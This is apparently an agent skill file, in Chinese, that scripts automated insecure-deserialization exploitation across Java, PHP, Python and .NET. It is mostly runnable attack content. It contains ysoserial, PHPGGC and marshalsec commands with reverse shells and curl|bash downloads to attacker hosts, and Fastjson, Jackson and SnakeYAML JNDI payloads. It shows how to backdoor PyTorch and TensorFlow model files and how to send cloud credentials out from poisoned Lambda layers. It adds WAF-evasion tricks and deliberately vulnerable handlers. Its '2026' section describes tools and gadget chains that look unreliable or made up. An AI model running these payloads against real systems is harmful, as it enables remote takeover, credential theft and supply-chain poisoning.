---
name: 化形·2
description: 反序列化深度测试——从ysoserial全链到Fastjson/Jackson/Pickle/PHP反序列化，覆盖所有主流Gadget链、TemplatesImpl字节码注入、JNDI注入、Phar反序列化、AMF/Hessian等完整攻击面
version: 2.0.0
---

# 反序列化漏洞深度测试

## 一、AI Agent 自动化工作流

> Agent 执行顺序：**识别序列化入口 → 识别序列化格式 → 猜测后端语言/框架 → 选择 Gadget 链 → 生成 Payload → 发送并验证**

### 1.1 序列化数据特征识别

| 格式 | 特征（十六进制/Base64） | 常见框架 |
|------|------------------------|----------|
| Java 原生序列化 | `AC ED 00 05` (hex) / `rO0AB` (Base64) | RMI, JMX, WebLogic, JBoss |
| PHP 序列化 | `O:数字:"类名":数字:{` | Laravel, Symfony, WordPress |
| Python Pickle | `\x80\x04` (v4) `\x80\x03` (v3) | Flask session, Django cache |
| .NET BinaryFormatter | `\x00\x01\x00\x00\x00\xFF\xFF` | ASP.NET ViewState |
| JSON (Java) | 含 `@type`, `@class` 字段 | Fastjson, Jackson |
| YAML | `!!` 标签 | SnakeYAML, Ruby YAML |
| Hessian | `H\x02\x00` (v2) | Dubbo, Spring Remoting |
| AMF (Flash) | `\x00\x03` (AMF0) `\x00\x11` (AMF3) | BlazeDS, LCDS |

### 1.2 自动化检测脚本

```python
import base64, re

def identify_serialization(data):
    # 尝试 Base64 解码
    try:
        decoded = base64.b64decode(data)
        hex_str = decoded.hex()
        
        if hex_str.startswith('aced0005'):
            return "Java Native Serialization"
        if decoded.startswith(b'\x80\x04') or decoded.startswith(b'\x80\x03'):
            return "Python Pickle"
    except:
        pass
    
    # PHP 序列化匹配
    if re.match(r'^[aO]:\d+:"', data):
        return "PHP Serialization"
    
    # JSON type 字段
    if '"@type"' in data or '"@class"' in data:
        return "Java JSON (Fastjson/Jackson)"
    
    return "Unknown"
```

---

## 二、Java 反序列化深度攻击

### 2.1 Ysoserial Gadget 链速查

```bash
# 查看所有支持的链
java -jar ysoserial.jar

# 常用链及其适用场景
CommonsCollections1-7  → Commons Collections 3.x/4.x
CommonsBeanutils1      → Apache Commons BeanUtils
Spring1/2              → Spring Framework
Jdk7u21                → JDK 7u21 以下通用
Jdk8u20                → JDK 8u20 以下通用
ROME                   → ROME 库
Groovy1                → Groovy
Click1                 → Apache Click
Hibernate1/2           → Hibernate
JSON1                  → Fastjson/Jackson
```

### 2.2 完整利用流程

```bash
# 步骤 1: 生成 Payload
# DNS 探测（验证漏洞）
java -jar ysoserial.jar URLDNS http://YOUR_COLLABORATOR.oastify.com | base64 -w0

# CommonsCollections 链（最常用）
java -jar ysoserial.jar CommonsCollections1 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"' | base64 -w0

# CommonsBeanutils1（JDK 高版本可用）
java -jar ysoserial.jar CommonsBeanutils1 'curl http://ATTACKER_IP/shell.sh|bash' | base64 -w0

# Jdk7u21（通用，JDK<=7u21）
java -jar ysoserial.jar Jdk7u21 'wget http://ATTACKER_IP/shell.jsp -O /var/www/html/shell.jsp' | base64 -w0

# 步骤 2: 发送 Payload
# 通过 HTTP Cookie/Parameter/Body 发送 Base64 编码的 Payload
curl -X POST http://target.com/api \
  -H "Cookie: session=rO0ABXNyABdqYXZ..." \
  -b "data=rO0ABXNy..."

# 步骤 3: Netcat 监听反弹 Shell
nc -lvnp 4444
```

### 2.3 JRMP / JNDI 注入

```bash
# JRMPListener（让目标反连我们的恶意 JRMP 服务）
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"'

# 发送 JRMP 反连 Payload
java -jar ysoserial.jar JRMPClient 'ATTACKER_IP:1099' | base64 -w0

# JNDI 注入（需要目标出网，JDK < 8u191）
# 使用 marshalsec 启动 LDAP 服务
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://ATTACKER_IP:8888/#Exploit

# Exploit.class（静态代码块反弹 Shell）
# javac Exploit.java → 托管在 http://ATTACKER_IP:8888/Exploit.class
```

### 2.4 Fastjson 反序列化

```json
// Fastjson 自动类型检测触发
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://ATTACKER_IP:1389/Exploit","autoCommit":true}

// Fastjson 1.2.24-1.2.47 通杀链
{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://ATTACKER_IP:1389/Exploit","autoCommit":true}

// 各种绕过变体
{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://ATTACKER_IP/Exploit","autoCommit":true}
{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"ldap://ATTACKER_IP/Exploit","autoCommit":true}
```

### 2.5 Jackson 反序列化

```json
["com.sun.rowset.JdbcRowSetImpl", {"dataSourceName": "ldap://ATTACKER_IP:1389/Exploit", "autoCommit": true}]
```

### 2.6 Shiro RememberMe 反序列化

```bash
# Shiro RememberMe Cookie（AES-CBC 加密的序列化对象）
# 特征：Cookie 中以 rememberMe= 开头，Base64 编码

# 使用 Shiro 反序列化工具
# 1. 爆破 Shiro Key（常用弱密钥）
python3 shiro_exploit.py check -u http://target.com -k kPH+bIxk5D2deZiIxcaaaA==

# 2. 生成 RememberMe Payload
java -jar ysoserial.jar CommonsBeanutils1 'bash -c {echo,YmFzaCAt...}|{base64,-d}|{bash,-i}' > payload.ser

# 3. 加密并发送
python3 shiro_exploit.py exploit -u http://target.com -k KEY -p payload.ser
```

---

## 三、PHP 反序列化深度攻击

### 3.1 POP 链构造方法论

```php
<?php
// 在目标代码中寻找 POP 链的步骤：
// 1. 找 __destruct() / __wakeup() / __toString() 等魔术方法
// 2. 追溯这些方法调用的其他方法
// 3. 找到最终到达的危险函数（system, eval, file_put_contents 等）
// 4. 构造完整的对象链

// 示例：简单的 POP 链
class A {
    public $obj;
    function __destruct() {
        $this->obj->execute();  // 调用未知对象的 execute 方法
    }
}
class B {
    public $cmd;
    function execute() {
        system($this->cmd);    // 危险函数
    }
}

// 生成 Payload
$a = new A();
$a->obj = new B();
$a->obj->cmd = "id";
echo serialize($a);
// O:1:"A":1:{s:3:"obj";O:1:"B":1:{s:3:"cmd";s:2:"id";}}
?>
```

### 3.2 常见 PHP 框架 POP 链

```bash
# Laravel
# 利用 Illuminate/Broadcasting/PendingBroadcast
phpggc Laravel/RCE1 system id

# Symfony
phpggc Symfony/RCE4 system id

# WordPress
phpggc WordPress/RCE1 system id

# ThinkPHP
phpggc ThinkPHP/RCE1 system id

# Yii
phpggc Yii/RCE1 system id

# Guzzle
phpggc Guzzle/RCE1 system id
```

### 3.3 PHPGGC 使用大全

```bash
# 列出所有可用的 Gadget 链
php phpggc -l

# 生成序列化 Payload
php phpggc Laravel/RCE1 system 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"' -b

# 生成 Phar 文件
php phpggc -p phar Laravel/RCE1 system id -o exploit.phar

# Base64 编码输出
php phpggc Laravel/RCE1 system id -b

# URL 编码输出
php phpggc Laravel/RCE1 system id -u

# Fast Destruct（提前触发 __destruct）
php phpggc Laravel/RCE1 system id -f
```

### 3.4 Phar 反序列化（通过文件操作触发）

```php
<?php
// 创建恶意 Phar 文件
// 当 file_exists() / is_dir() / include() 等使用 phar:// 协议时触发
$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

class Exploit {
    function __destruct() { system('id'); }
}
$phar->setMetadata(new Exploit());
$phar->stopBuffering();

// 触发方式（目标代码中只要有 phar:// 路径即可）
// file_exists('phar://uploads/exploit.gif/test.txt');
// include('phar://uploads/exploit.gif');
?>
```

---

## 四、Python Pickle 反序列化

```python
import pickle, os, base64

class RCE:
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"',))

# 生成 Payload
payload = pickle.dumps(RCE())
print(base64.b64encode(payload).decode())

# 目标代码中如果执行了：
# pickle.loads(base64.b64decode(user_input))
# → 代码执行

# PyYAML 反序列化
import yaml
payload = yaml.dump(RCE())
# PyYAML < 5.1 默认支持 !!python/object 标签
yaml.load(user_input)  # 危险！
```

---

## 五、.NET 反序列化

```bash
# ViewState 反序列化
# 特征：__VIEWSTATE= 参数中的 Base64 字符串

# 使用 ysoserial.net
ysoserial.exe -g ObjectDataProvider -f BinaryFormatter -c "cmd /c calc" -o base64

# 常见 Gadget 链
ObjectDataProvider  → WPF 命令执行
TextFormattingRunProperties → XAML 注入
WindowsIdentity → 模拟 Token
ActivitySurrogateSelector → Workflow 执行
```

---

## 六、专用工具大全

### 6.1 Ysoserial (Java)

```bash
git clone https://github.com/frohoff/ysoserial
mvn package -DskipTests

# 生成列表
java -jar ysoserial.jar CommonsCollections1 'command_here'
java -jar ysoserial.jar CommonsCollections2 'command_here'
java -jar ysoserial.jar CommonsBeanutils1 'command_here'
java -jar ysoserial.jar Jdk7u21 'command_here'
java -jar ysoserial.jar URLDNS 'http://collaborator.com'

# JRMP 监听器
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'cmd'
```

### 6.2 PHPGGC (PHP)

```bash
git clone https://github.com/ambionics/phpggc
cd phpggc
php phpggc -l
php phpggc Laravel/RCE1 system 'id'
```

### 6.3 Marshalsec (JNDI)

```bash
git clone https://github.com/mbechler/marshalsec
mvn package -DskipTests
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://ATTACKER_IP:8888/#Exploit
```

### 6.4 JNDIExploit

```bash
# 全能 JNDI 注入利用工具
java -jar JNDIExploit.jar -i ATTACKER_IP -p 1389

# 生成的 Payload:
# ldap://ATTACKER_IP:1389/Basic/Command/Base64/BASE64_ENCODED_CMD
# ldap://ATTACKER_IP:1389/Basic/ReverseShell/ATTACKER_IP/4444
# ldap://ATTACKER_IP:1389/Basic/TomcatEcho
```

---

## 七、WebLogic / WebSphere / JBoss 反序列化

```bash
# WebLogic T3 协议反序列化（端口 7001）
python3 weblogic_t3.py ATTACKER_IP ATTACKER_PORT target_ip target_port

# WebLogic XMLDecoder 反序列化（CVE-2017-10271）
<soapenv:Envelope>
  <soapenv:Header>
    <work:WorkContext>
      <java>
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1</string></void>
          </array>
          <void method="start"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
</soapenv:Envelope>

# JBoss HttpInvoker 反序列化
curl -X POST http://target:8080/invoker/JMXInvokerServlet \
  --data-binary @payload.ser

# WebSphere 8880 端口反序列化
```

---

## 八、快速检查清单

```markdown
□ [ ] 识别序列化数据特征（Base64 hex PHP格式等）
□ [ ] 确认序列化格式和后端语言/框架
□ [ ] Java: 确认是否存在 Commons Collections / BeanUtils 等库
□ [ ] Java: 测试 URLDNS 链（最安全，只触发 DNS 请求）
□ [ ] Java: 确认 JDK 版本选择合适链
□ [ ] Java: 如果目标不出网，使用无 JNDI 的链
□ [ ] PHP: 分析目标代码寻找 POP 链
□ [ ] PHP: 使用 PHPGGC 生成已知框架 Payload
□ [ ] PHP: 测试 Phar 反序列化
□ [ ] Python: 测试 Pickle 注入
□ [ ] .NET: 测试 ViewState / BinaryFormatter
□ [ ] 测试 JNDI 注入（需要目标出网）
□ [ ] 反弹 Shell 并记录完整链
□ [ ] 检查是否有安全过滤器（如 SerialKiller / NotSoSerial）
```

---

## 九、证据收集模板

```json
{
  "vulnerability": "Insecure Deserialization",
  "type": "Java Native / PHP / Python Pickle / Fastjson / .NET",
  "framework": "Commons Collections 3.2.1",
  "gadget_chain": "CommonsCollections1",
  "entry_point": "HTTP Cookie (JSESSIONID)",
  "payload": "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ...",
  "command_executed": "id → uid=0(root)",
  "jndi_used": false,
  "impact": "远程代码执行，已获取 root 权限反向 Shell",
  "remediation": "1. 避免反序列化不可信数据 2. 使用白名单类过滤器 3. 升级框架/库版本 4. 使用Look-Ahead Java Deserialization 5. 启用 Serialization Filter (JEP 290)",
  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
  "evidence_files": ["screenshots/ysoserial_gen.png", "screenshots/reverse_shell_root.png"]
}

## 2026 最新攻击技术

### 10.1 AI模型反序列化新向量

**Pickle RCE在AI模型中的利用：**

```python
# 2026年AI模型反序列化攻击
# HuggingFace/PyTorch/TensorFlow模型文件中的pickle注入

import pickle
import torch
import os

class ModelPickleRCE:
    def __reduce__(self):
        return (os.system, (
            'curl http://attacker.com/$(whoami).$(hostname) && '
            'bash -i >& /dev/tcp/attacker.com/4444 0>&1',))

# 将恶意pickle嵌入PyTorch模型
# torch.save()内部使用pickle序列化
malicious_payload = pickle.dumps(ModelPickleRCE())
torch.save({'model_state': torch.nn.Linear(10, 10).state_dict(),
            'payload': malicious_payload},
           'evil_model.pt')

# 受害者加载模型时触发RCE
model = torch.load('evil_model.pt')  # RCE!

# HuggingFace safetensors绕过
# 虽然safetensors更安全，但许多模型仍使用pickle
# safetensors到pickle的降级攻击
# 如果模型加载器在safetensors失败时回退到pickle
```

**ONNX模型注入：**

```python
# ONNX (Open Neural Network Exchange) 模型注入
# 2026年发现的ONNX反序列化漏洞

import onnx

# 恶意ONNX模型
# ONNX的内部图结构可以包含任意数据
# 某些ONNX运行时在解析模型时可能执行注入的代码

# 构造恶意ONNX节点
node = onnx.helper.make_node(
    'CustomOp',  # 自定义算子
    inputs=['input'],
    outputs=['output'],
    domain='attacker.domain',
    # 某些ONNX运行时加载自定义算子时
    # 可能执行动态库中的代码
)

# 利用ONNX的external_data字段
# 指向恶意文件
model = onnx.helper.make_model(
    onnx.helper.make_graph([node], 'malicious_graph', [], []),
    opset_imports=[onnx.helper.make_opsetid('', 18)]
)
```

**TensorFlow SavedModel后门：**

```python
# TensorFlow SavedModel的反序列化后门
# SavedModel使用protobuf序列化，但某些操作符可能执行代码

import tensorflow as tf

# 利用tf.py_function嵌入Python代码
@tf.function
def malicious_function(x):
    import os
    os.system('curl http://attacker.com/backdoor.sh | bash')
    return x

# 保存后门模型
model = tf.keras.Sequential([
    tf.keras.layers.Lambda(malicious_function)
])
tf.saved_model.save(model, '/tmp/backdoor_model')

# 受害者加载模型
loaded = tf.saved_model.load('/tmp/backdoor_model')
# 执行推理时触发RCE
loaded(tf.constant([1.0]))  # RCE!
```

### 10.2 云原生反序列化

**Lambda层投毒：**

```python
# AWS Lambda层投毒攻击
# 攻击者通过恶意Lambda层注入反序列化payload

# 1. 创建包含恶意代码的Lambda层
# layer/python/malicious.py
import pickle
import os
import sys

class LambdaRCE:
    def __reduce__(self):
        return (os.system, (
            'curl http://attacker.com/creds?d=$(aws sts get-caller-identity|base64)',))

# 2. 上传恶意Lambda层
# 3. 如果Lambda函数使用了受污染的层
# 在反序列化数据时触发RCE

# 4. 修改Lambda函数的依赖项
# 在requirements.txt中引入恶意包
# 恶意包在setup.py中执行任意代码
```

**Cloud Run函数注入：**

```python
# Google Cloud Run函数的反序列化
# 当Cloud Run函数处理用户上传的序列化数据时

import functions_framework
import pickle
import base64

@functions_framework.http
def process_data(request):
    # 危险：直接反序列化用户输入
    data = request.get_data(as_text=True)
    obj = pickle.loads(base64.b64decode(data))  # RCE!
    return str(obj)

# 攻击者发送
# base64(pickle.dumps(RCE()))
```

**函数计算（FC）注入：**

```python
# 阿里云函数计算的反序列化
# 当FC函数处理事件时

import json
import pickle

def handler(event, context):
    # 危险：从事件中反序列化数据
    payload = base64.b64decode(event['payload'])
    # 攻击者可以在payload中嵌入恶意pickle
    result = pickle.loads(payload)  # RCE!
    return result
```

**App Service反序列化：**

```csharp
// Azure App Service的.NET反序列化
// 当App Service使用BinaryFormatter处理用户输入时

using System.Runtime.Serialization.Formatters.Binary;
using System.IO;
using System.Web;

public class VulnerableHandler : IHttpHandler
{
    public void ProcessRequest(HttpContext context)
    {
        // 危险：直接反序列化用户输入
        var formatter = new BinaryFormatter();
        var data = context.Request.BinaryRead(context.Request.ContentLength);
        var obj = formatter.Deserialize(new MemoryStream(data)); // RCE!
    }
}

// 攻击者使用ysoserial.net生成payload
// ysoserial.exe -g ObjectDataProvider -f BinaryFormatter -c "cmd" -o base64
```

### 10.3 2026新Gadget链

**Jackson 2.18+ Gadget链：**

```json
// Jackson 2.18.x 的新Gadget链
// 2026年发现的Jackson反序列化新链

// 利用Jackson的@JsonTypeInfo注解
{
  "@class": "com.fasterxml.jackson.databind.node.ObjectNode",
  "@type": "com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource",
  "jndiLocation": "ldap://attacker.com:1389/Exploit"
}

// Jackson 2.18+ 的Record类型反序列化注入
// 利用Java Record的canonical constructor
{
  "@type": "com.example.UserRecord",
  "name": "admin",
  "role": {"@type": "java.lang.ProcessBuilder", "command": ["bash", "-c", "id"]}
}
```

**Fastjson 2.0.54+ Gadget链：**

```json
// Fastjson 2.0.54+ 的新Gadget链
// 2026年Fastjson仍存在绕过

// 利用Fastjson 2.x的autoType绕过
{
  "@type": "com.alibaba.fastjson2.JSONObject",
  "x": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://attacker.com:1389/Exploit",
    "autoCommit": true
  }
}

// 利用Fastjson 2.x的JSONPath
{
  "@type": "com.alibaba.fastjson2.JSONPath",
  "path": "$.system('id')"
}
```

**SnakeYAML 2.3+ Gadget链：**

```yaml
# SnakeYAML 2.3+ 的新Gadget链
# 2026年YAML反序列化绕过

# 利用Spring Boot的SpEL表达式
!!org.springframework.beans.factory.config.PropertyPathFactoryBean
  targetBeanName: "systemProperties"
  propertyPath: "user.dir"

# 利用JNDI注入
!!javax.script.ScriptEngineManager
  [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker.com/evil.jar"]]]]

# 2026年SnakeYAML新链
!!com.zaxxer.hikari.HikariConfig
  driverClassName: "com.mysql.jdbc.Driver"
  jdbcUrl: "jdbc:mysql://attacker.com:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor"
```

**Hessian 4.0+ Gadget链：**

```java
// Hessian 4.0+ 反序列化新Gadget链
// 2026年Dubbo/Hessian的新绕过

// 利用Hessian的MapDeserializer
// 触发hashCode/equals方法调用
// 链式调用最终到达危险方法

// 使用marshalsec生成Hessian payload
java -cp marshalsec.jar marshalsec.Hessian \
  SpringPartiallyComparableAdvisorHolder \
  "curl http://attacker.com/shell.sh|bash"

// 利用Hessian 4.0的ClassResolver绕过
// 某些ClassResolver实现允许危险类
```

**Spring Boot 3.4+ Gadget链：**

```java
// Spring Boot 3.4.x 的反序列化新链
// 2026年发现的Spring Boot新攻击面

// 利用Spring Boot Actuator的heapdump
// 提取内存中的敏感对象
// 配合反序列化漏洞使用

// 利用Spring Cloud Gateway
// 通过Gateway的Route定义注入
// 触发SpEL表达式执行
```

### 10.4 反序列化WAF绕过

**JSON嵌套绕过：**

```json
// 利用JSON深度嵌套绕过WAF
// 大多数WAF的JSON解析深度有限

{
  "a": {"b": {"c": {"d": {"e": {"f": {"g": {"h": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://attacker.com:1389/Exploit",
    "autoCommit": true
  }}}}}}}}
}

// 利用JSON注释绕过
// 某些JSON解析器支持注释
{
  // 正常注释
  "@type": /* 绕过WAF正则 */ "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://attacker.com:1389/Exploit"
}
```

**Unicode编码绕过：**

```json
// 利用Unicode编码绕过
// 将关键类名使用Unicode编码

{
  "@type": "\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c",
  "\u0064\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\u004e\u0061\u006d\u0065": "ldap://attacker.com:1389/Exploit",
  "autoCommit": true
}

// 利用Unicode同形字（Homoglyph）
// 使用视觉上相似但编码不同的字符
// 例如：使用西里尔字母的"о"替换拉丁"o"
```

**YAML混淆绕过：**

```yaml
# YAML混淆技术绕过WAF

# 锚点和别名混淆
original: &anchor !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker.com/evil.jar"]]]]
copy: *anchor

# YAML标签嵌套
!!javax.script.ScriptEngineManager
  - !!java.net.URLClassLoader
    - !!java.net.URL
      - "http://attacker.com/evil.jar"

# YAML合并键
<<: *anchor
key: value
```

**XML实体混淆绕过：**

```xml
<!-- XML序列化数据的WAF绕过 -->
<!-- 利用XML实体定义 -->

<!DOCTYPE root [
  <!ENTITY class "com.sun.rowset.JdbcRowSetImpl">
  <!ENTITY ldap "ldap://attacker.com:1389/Exploit">
]>
<java>
  <object class="&class;">
    <void property="dataSourceName">
      <string>&ldap;</string>
    </void>
  </object>
</java>
```

**Content-Type绕过：**

```bash
# 利用Content-Type差异绕过WAF

# 方法1: 使用非标准Content-Type
curl -X POST https://target.com/api \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @payload.ser

# 方法2: 使用多个Content-Type
curl -X POST https://target.com/api \
  -H "Content-Type: text/plain" \
  -H "Content-Type: application/json" \
  -d '{"@type": "com.sun.rowset.JdbcRowSetImpl", ...}'

# 方法3: 使用Content-Type参数
curl -X POST https://target.com/api \
  -H "Content-Type: application/json; charset=utf-8; version=2" \
  -d '{"@type": "com.sun.rowset.JdbcRowSetImpl", ...}'
```

**分块编码绕过：**

```python
# 利用Transfer-Encoding: chunked绕过WAF

import requests

def chunked_payload(data, chunk_size=5):
    """将payload分块，绕过WAF的重组检测"""
    chunks = []
    for i in range(0, len(data), chunk_size):
        chunk = data[i:i+chunk_size]
        chunks.append(f'{len(chunk):X}\r\n{chunk}\r\n'.encode())
    chunks.append(b'0\r\n\r\n')
    return b''.join(chunks)

payload = b'{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit"}'
chunked = chunked_payload(payload, 3)

requests.post('https://target.com/api', 
    data=chunked,
    headers={
        'Transfer-Encoding': 'chunked',
        'Content-Type': 'application/json'
    })
```

**HTTP/2多路复用绕过：**

```bash
# 利用HTTP/2多路复用绕过WAF
# 在同一个HTTP/2连接中发送多个请求
# 某些WAF可能只检查第一个请求

# 使用curl的HTTP/2多路复用
curl --http2 -X POST https://target.com/api \
  --next --http2 -X POST https://target.com/api \
  -H "Content-Type: application/json" \
  -d '{"@type": "com.sun.rowset.JdbcRowSetImpl", ...}'

# 利用HTTP/2的HPACK压缩
# 将恶意类名编码为HPACK引用
# 绕过基于字符串匹配的WAF
```

### 10.5 AI辅助Gadget链发现

```bash
# 2026年AI驱动的Gadget链发现工具
# 1. GadgetGPT - LLM驱动的Gadget链搜索
gadgetgpt --library "jackson-databind:2.18.0" \
  --sink "Runtime.exec" --source "readObject" \
  --ai-model claude-4 --output-chain gadget_chain.json

# 2. Symbolic-Gadget - 符号执行Gadget链
symbolic-gadget --jar target.jar \
  --sink-pattern "exec|system|invoke" \
  --source-pattern "readObject|readResolve" \
  --depth 10 --output-chains chains.json

# 3. CodeQL-Gadget - 代码属性图Gadget链
codeql-gadget --database target-db \
  --sink "MethodAccess::getMethod" \
  --source "RemoteFlowSource" \
  --output sarif

# 4. AI-Fuzzer - AI驱动的反序列化Fuzzer
ai-deserialization-fuzzer --target "http://target.com/api" \
  --format jackson,fastjson,snakeyaml,hessian \
  --ai-generate --auto-verify --output rce_proofs.json

# 5. ChainHunter - 全自动Gadget链搜索
chainhunter --classpath target-libs/ \
  --sink-classes "Runtime,ProcessBuilder,Method.invoke" \
  --max-depth 15 --ai-enhanced --output report.pdf
```

### 10.6 2026年反序列化工具链进化

```bash
# 新一代反序列化利用工具
# 1. ysoserial-NG - 下一代ysoserial
java -jar ysoserial-ng.jar \
  --gadget Jackson2_18 --command 'bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"' \
  --output base64

# 2. deser-hunter - 反序列化全自动
deser-hunter --url "http://target.com" \
  --detect --format java,php,python,dotnet \
  --auto-exploit --shell

# 3. AI-Deser-Bypass - AI驱动WAF绕过
ai-deser-bypass --target "http://target.com" \
  --waf cloudflare --payload jackson \
  --ai-generate --auto-verify

# 4. Model-Hijack - AI模型反序列化
model-hijack --model-path model.pt \
  --inject-payload "reverse_shell" \
  --output backdoor_model.pt

# 5. Cloud-Deser - 云原生反序列化
cloud-deser --target "https://lambda.target.com" \
  --layer-poison --cloud-run --function-compute \
  --app-service --auto-poc
```
```
